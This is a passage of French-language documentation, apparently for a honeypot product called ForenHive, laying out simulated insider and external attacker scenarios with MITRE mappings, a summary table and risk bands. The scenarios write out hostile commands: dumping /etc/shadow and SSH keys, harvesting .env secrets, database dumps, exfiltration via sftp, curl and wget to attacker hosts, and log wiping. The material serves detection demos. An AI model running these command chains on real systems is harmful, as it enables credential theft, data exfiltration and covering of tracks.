    ssh backup@honeypot   → succeeded  ← compte backup avec accès large
    ssh deploy@honeypot   → succeeded
    ... (3 autres comptes connus de l'infra)

[T+05:00] PHASE 2 — COLLECTE DE CREDENTIALS (T1552.001)
  47 commandes exécutées sur plusieurs sessions — activité ciblée et méthodique :

    # Extraction des hashes de mots de passe
    $ sudo cat /etc/shadow > /tmp/.sh_dump
    [YARA déclenché : credential_harvester]

    # Clés SSH de tous les utilisateurs
    $ find /home /root -name "id_rsa" -o -name "*.pem" 2>/dev/null
    $ cp /root/.ssh/id_rsa /tmp/.rsa_key

    # Tokens et secrets applicatifs
    $ cat /opt/app/.env | grep -i "secret\|key\|pass\|token"
    $ cat /etc/nginx/sites-enabled/*.conf | grep "ssl_certificate_key"
    $ find /opt /srv /var/www -name "*.env" -o -name "config.yml" 2>/dev/null

    # Base de données — dump des tables sensibles
    $ mysqldump -u root -p forenhive_db users sessions > /tmp/.db_dump.sql
    $ pg_dump -U postgres forenhive > /tmp/.pg_dump.sql

    # Journaux d'accès — effacer les traces futures
    $ last | head -30  → qui d'autre s'est connecté (se fondre dans le bruit)

[T+20:00] PHASE 3 — MOUVEMENT LATÉRAL SMB INTERNE (T1021.002)
  L'employé cible les partages Windows internes pour collecter documents :

  EPMapper scan (6 requêtes port 135) :
    → Détecte serveurs Windows sur 10.212.0.0/16
    → Identifie partages : \\srv-fichiers\RH  \\srv-fichiers\Compta  \\srv-fichiers\DSI

  SMB share enumeration depuis Dionaea :445 :
    net use \\srv-rh\RH /user:DOMAINE\employe MotDePasse
    copy \\srv-rh\RH\*.* /tmp/rh_docs/
    net use \\srv-compta\Compta /user:DOMAINE\employe MotDePasse
    copy \\srv-compta\Compta\*.xlsx /tmp/compta/

[T+35:00] PHASE 4 — EXFILTRATION (3,8 MB) (T1048)
  Utilise des canaux légitimes pour sortir les données (non alertés par le DLP) :

    # Via SFTP vers un serveur personnel externe
    $ sftp employe@perso.duckdns.org
    sftp> put /tmp/.sh_dump
    sftp> put /tmp/.rsa_key
    sftp> put /tmp/.db_dump.sql
    sftp> put /tmp/.pg_dump.sql
    sftp> put /tmp/compta/

    # Alternative : upload chiffré
    $ gpg --recipient attacker@protonmail.com --encrypt /tmp/.sh_dump
    $ curl -s -F "f=@/tmp/.sh_dump.gpg" https://file.io/upload

[T+48:00] PHASE 5 — ANTI-FORENSICS (T1070)
  Nettoyage minutieux — l'employé connaît les outils de monitoring :

    $ history -c && unset HISTFILE HISTSIZE
    $ find /tmp -name ".*" -exec rm -f {} \;
    $ rm -f /tmp/.sh_dump /tmp/.rsa_key /tmp/.db_dump.sql /tmp/.pg_dump.sql
    $ echo "" > /var/log/auth.log  → vide le log d'auth
    $ find /var/log -name "*.log" -newer /tmp -exec truncate -s 0 {} \;

  Malgré ce nettoyage, ForenHive détecte l'activité grâce au honeypot interne :
  les accès à 10.212.50.5 → honeypot sont loggés dans Elasticsearch
  avant tout nettoyage possible.

[T+53:00] FIN — employé déconnecte. Alerte INSIDER_THREAT levée par ForenHive.
```

**Interprétation:** Représente une fuite interne intentionnelle — employé exfiltrant des fichiers système sensibles depuis le réseau d'entreprise. Démontre la valeur des honeypots internes pour détecter les menaces internes que les outils périmètriques ne voient pas.

---

## Tier 5 — Insider Amateur (Mouvement latéral interne)

---

### 12. `10.212.50.20` — Tentative de Mouvement Latéral (Réseau Interne)

**Label:** Insider lateral-movement attempt  
**Réseau:** Interne — `10.212.0.0/16`  
**Statut:** RFC1918 — IP privée

**Profil de menace:**
- Acteur interne moins expérimenté — aucune connexion réussie.
- Tente une **énumération SMB** (cartographie des partages réseau).
- 3 pré-scans EPM → recherche automatique de services exposés.
- 14 tentatives de connexion Dionaea, toutes échouées.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 7 minutes |
| Tentatives | 14 |
| Succès | 0 |
| Exfiltration | 0 |

**Tags:** `reconnaissance`  
**MITRE:** T1110.001, T1021.002 — phase `discovery`

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] CONTEXTE — Employé standard, pas d'accès root.
  A découvert l'existence d'un serveur interne via l'annuaire réseau.
  Curieux de voir ce qu'il peut accéder — pas nécessairement malveillant.
  Utilise un script trouvé en ligne pour "tester" la sécurité interne.

[T+00:00] PHASE 1 — EPMapper SCAN (port 135) — 3 requêtes
  Script Python basique pour détecter les services Windows :

    import socket
    for ip in ["10.212.0.1","10.212.0.10","10.212.50.1"]:
        s = socket.connect_ex((ip, 135))
        if s == 0: print(f"{ip}:135 open")

  → Détecte des hôtes actifs sur le segment interne.

[T+01:00] PHASE 2 — TENTATIVES SMB (Dionaea :445) — 14 tentatives
  Essaie d'accéder aux partages réseau avec ses credentials Windows :

    net use \\10.212.50.X\ADMIN$ /user:DOMAINE\employe20 MonMotDePasse
    → System error 5 (accès refusé)

    net use \\10.212.50.X\C$ /user:DOMAINE\employe20 MonMotDePasse
    → System error 5

    net view \\10.212.50.X
    → System error 53 (chemin réseau introuvable — honeypot)

  14 combinaisons testées manuellement — toutes échouent.
  L'utilisateur ne comprend pas pourquoi il n'a pas accès.

[T+07:00] FIN — abandonne. Ne sait pas qu'il vient de toucher un honeypot.
  ForenHive lève une alerte MEDIUM : mouvement latéral interne détecté.
  L'activité est remontée au RSSI pour investigation.
```

---

## Tier 6 — TN-Medium (Acteur Tunisien Organisé)

---

### 13. `41.231.53.40` — Acteur TN Ciblé (Tunis)

**Label:** TN-based actor (Tunisie Telecom)  
**Organisation:** Tunisie Telecom (ASN 2609)  
**Pays:** Tunisie 🇹🇳

**Profil de menace:**
- Acteur tunisien utilisant un **VPN** pour masquer son activité — choix délibéré, contrairement aux IPs résidentielles amateur.
- Score d'abus **58/100**, 142 signalements — intentionalité confirmée.
- Frappe **3 honeypots** simultanément (cowrie + dionaea + galah) — capacité multi-vecteur.
- **2 connexions SSH réussies**, 92 KB exfiltrés, 2 fichiers téléchargés.
- Règle YARA `generic_recon` — outillage de reconnaissance automatisé.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 28 minutes |
| Tentatives | 64 |
| Succès | 2 |
| Commandes | 21 |
| Exfiltration | 92 KB |

**Tags:** `reconnaissance`, `credential_access`, `lateral`  
**MITRE:** T1110.003, T1078, T1021.002 — phase `lateral_movement`

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — PRÉPARATION (hors honeypot — déduit du comportement)
  L'attaquant, basé à Tunis, active son VPN avant de lancer l'attaque.
  Son IP réelle Tunisie Telecom (41.231.53.40) est visible car son VPN
  fonctionne mal ou a été configuré en split-tunnel.

  Outil préparé : script Python personnalisé combinant SSH brute-force
  + HTTP scanning + SMB enumeration.
  [YARA déclenché : generic_recon — signatures du script]

[T+00:30] PHASE 2 — BRUTE-FORCE SSH CIBLÉ (Cowrie :2222)
  64 tentatives avec une wordlist locale adaptée au contexte tunisien + arabe :

    root:azerty | root:123456 | admin:admin123 | root:tunisia2024
    sysadmin:Azerty1! | deploy:deploy2024 | backup:backup@2024
    (+ wordlist rockyou standard en parallèle)

  2 succès sur Cowrie :
    2026-06-09T15:00:14Z login [backup/backup@2024] succeeded
    2026-06-09T15:08:30Z login [deploy/deploy2024] succeeded

[T+05:00] PHASE 3 — RECONNAISSANCE POST-ACCÈS (21 commandes)
  L'attaquant exécute un script de reconnaissance automatique :

    $ uname -a && hostname && id
    $ cat /etc/os-release
    $ ip addr show && ip route
    $ netstat -tlnp 2>/dev/null || ss -tlnp
    → Identifie les services en écoute

    $ ps aux --sort=-%mem | head -20
    → Processus les plus gourmands (identifie les applis importantes)

    $ find /var/www /opt /srv -maxdepth 3 -name "*.php" -o -name "*.py" \
      -o -name "*.conf" 2>/dev/null | head -30
    → Recherche de fichiers de configuration applicatifs

    $ cat /etc/hosts && cat /etc/resolv.conf
    → Noms internes et DNS → révèle l'architecture interne

    $ ls /home/ && ls /root/ 2>/dev/null
    $ cat /etc/crontab

[T+12:00] PHASE 4 — SMB ENUMERATION (T1021.002 via Dionaea :445)
  Pivote vers le réseau interne :
    smbclient -L //10.212.x.x -U "" -N    ← null session
    smbclient -L //10.212.x.x -U "deploy" -p "deploy2024"
    → Tente d'accéder aux partages avec les credentials SSH trouvés

[T+16:00] PHASE 5 — HTTP RECON (Galah :8080)
  Scan web automatique sur Galah :

    GET /api/v1/ → Galah génère une fausse API REST crédible
    GET /admin/  → Galah génère un faux panneau admin
    POST /api/login {"user":"admin","pass":"admin123"} → 401 simulé
    GET /.git/config → recherche repo git exposé

[T+20:00] PHASE 6 — TÉLÉCHARGEMENT & EXFILTRATION (92 KB)
  2 fichiers téléchargés : scripts de reconnaissance supplémentaires
  récupérés depuis un serveur de staging :

    $ wget -q http://staging.attacker.tn/recon.sh -O /tmp/.r && chmod +x /tmp/.r
    $ wget -q http://staging.attacker.tn/enum.sh  -O /tmp/.e && chmod +x /tmp/.e
    $ /tmp/.r 2>/dev/null | curl -s -X POST http://41.231.53.40:9999/data --data-binary @-

  92 KB d'informations système collectées et envoyées au serveur de staging.

[T+28:00] FIN — session fermée, VPN désactivé.
  Alerte HIGH levée par ForenHive : acteur organisé TN, multi-honeypot,
  2 succès SSH, exfiltration confirmée.
```

**Interprétation:** Scénario "local threat" — pertinent dans le contexte tunisien pour montrer que la menace ne vient pas uniquement de Russie ou d'Europe. Différencie un acteur organisé local (VPN + multi-honeypot) des simples résidentiels amateurs (IPs 8 et 9).

---

## Récapitulatif des 13 IPs

| # | IP | Tier | Pays | Score Abus | VT Malicious | Honeypots | Exfil | MITRE Stage |
|---|---|---|---|---|---|---|---|---|
| 1 | 185.220.101.5 | Expert | DE | 100 | 38 (Mirai) | 3 | 1,24 MB | actions_on_objectives |
| 2 | 45.227.255.206 | Expert | RU | 97 | 24 (C. Strike) | 2 | 880 KB | actions_on_objectives |
| 3 | 194.165.16.11 | Expert | RU | 100 | 56 (WannaCry) | 3 | 2,4 MB | actions_on_objectives |
| 4 | 80.82.77.33 | Medium | NL | 78 | 6 | 2 | 0 | lateral_movement |
| 5 | 92.118.39.18 | Medium | PA | 64 | 3 | 2 | 14 KB | lateral_movement |
| 6 | 141.98.10.62 | Medium | LT | 70 | 2 | 2 | 0 | lateral_movement |
| 7 | 5.188.10.156 | Medium | RU | 82 | 4 (Botnet) | 2 | 8,4 KB | lateral_movement |
| 8 | 41.230.42.17 | Amateur | TN | 14 | 0 | 1 | 0 | credential_access |
| 9 | 197.0.5.12 | Amateur | TN | 8 | 0 | 1 | 0 | credential_access |
| 10 | 188.166.13.4 | Amateur | GB | 22 | 0 | 1 | 0 | credential_access |
| 11 | 10.212.50.5 | Insider Expert | Interne | 0 | 0 | 2 | **3,8 MB** | actions_on_objectives |
| 12 | 10.212.50.20 | Insider Amateur | Interne | 0 | 0 | 1 | 0 | discovery |
| 13 | 41.231.53.40 | TN-Medium | TN | 58 | 2 | 3 | 92 KB | lateral_movement |

---

## Bandes de risque appliquées

```
Score ≥ 70  →  CRITICAL  (rouge)
Score 45–69 →  HIGH      (orange)
Score 25–44 →  MEDIUM    (jaune)
Score < 25  →  LOW       (vert)
```

Les IPs expert et insider_expert tombent toutes en bande **CRITICAL**.  
Les IPs medium/medium_tn en **HIGH**.  
Les IPs amateur en **LOW**.  
L'insider_amateur (10.212.50.20) tombe en **MEDIUM** du fait de l'énumération SMB interne.
